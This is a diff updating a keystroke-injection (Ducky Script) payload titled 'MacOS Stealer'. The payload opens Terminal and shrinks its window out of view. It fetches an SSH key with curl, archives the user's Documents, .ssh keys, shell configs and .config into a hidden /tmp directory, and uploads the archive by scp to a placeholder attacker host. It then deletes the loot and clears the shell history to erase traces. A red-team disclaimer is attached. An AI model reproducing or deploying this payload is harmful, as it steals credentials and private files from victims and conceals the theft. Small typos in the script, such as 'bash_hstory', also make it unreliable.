@@ -1,23 +1,58 @@
-REM Title: MacOS Stealer
-REM Author: un1x01d
-REM Description: The script will compress the Desktop and Documents folders in a hidden location, afterwhich the file will be uploaded to an FTP server an deleted.
-REM Target: MacOS 10.0+
-REM Version: 1.0
+EM Author: un1x01d
+REM Description: The script will compress the Desktop and Documents folders in a hidden location, afterwhich the file will be uploaded to an SCP server an deleted.
+REM Notes: This script was created to help with a red-team engagements requiring actual data as evidence. Only use this tool on personal or Authorized macs.
+REM Target: MacOS 10.0+ (Built-in ssh/scp)
+REM Version: 1.1
 
+REM DELAY 100
+REM GUI m
+DELAY 500
 GUI SPACE
-DELAY 100
+DELAY 200
 STRING Terminal
-ENTER
 DELAY 100
-
-STRING mkdir -p /tmp/.s/.t/.e/.a/.l && cd /tmp/.s/.t/.e/.a/.l && find . ~/Downloads >> Downloads.list && find ~/ >> home_dir_file_list.txt && tar cfz loot.tgz ~/Documents ~/.ssh ~/.bash* ~/.config ~/.zsh* &
 ENTER
-DELAY 10
 
+REM ##############################################################
+REM # Shrink and move the console window to the top right corner #
+REM ##############################################################
+DELAY 300
+STRING osascript -e 'tell application "Terminal" to set bounds of front window to {2500, 50, 20, 20}' ; clear &&
+ENTER
+DELAY 300
 STRING clear
 ENTER
 
-STRING wait %1 && echo "All Done" && clear && exit
+REM #################################################
+REM # Download the ssh private key from the set URL #
+REM #################################################
+STRING mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://<url to private key> -o /tmp/.s/.t/.e/.a/.l/.s && chmod 600 /tmp/.s/.t/.e/.a/.l/.s && clear
 ENTER
-DELAY 10
+DELAY 300
+
+REM ###################################################################################################
+REM # Compress the looted files.                                                                      #
+REM # In this configuration a list of the home directory and the Downloads directories is generated   #
+REM # The most common loot paths are ~/Desktop and ~/Documents, so they are added by default.          #
+REM ###################################################################################################
+STRING cd /tmp/.s/.t/.e/.a/.l && clear && \
+DELAY 200
+ENTER
+STRING find . ~/Downloads >> Downloads.list && find ~/ >> home_dir_file_list.txt && tar cfz .loot.tgz ~/Documents ~/.ssh ~/.bash* ~/.config ~/.zsh* Downloads.list home_dir_file_list.txt &
+DELAY 200
+ENTER
+
+REM ##########################################################################################################################################################################
+REM # SCP the looted files to the attackers SCP server. Delete the looted files and all traces. (This will delete the history and history files to avoid leaving any traces) #
+REM # Usage: Replace the <attaccker username<, <attacker hostname> and <remote storage path>                                                                                 #
+REM ##########################################################################################################################################################################
+STRING wait %1 && clear && scp -q -P 9112 -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz <ssh username>@<attacker hostname>:<remote storage path>o && set -e && rm -rf /tmp/.s ~/.bash_hstory ~/.zsh_history && history -c && exit
+ENTER
+
+REM #####################################
+REM # Minimize the window during upload #
+REM #####################################
+DELAY 500
 GUI m
+DELAY 200
+GUI TAB
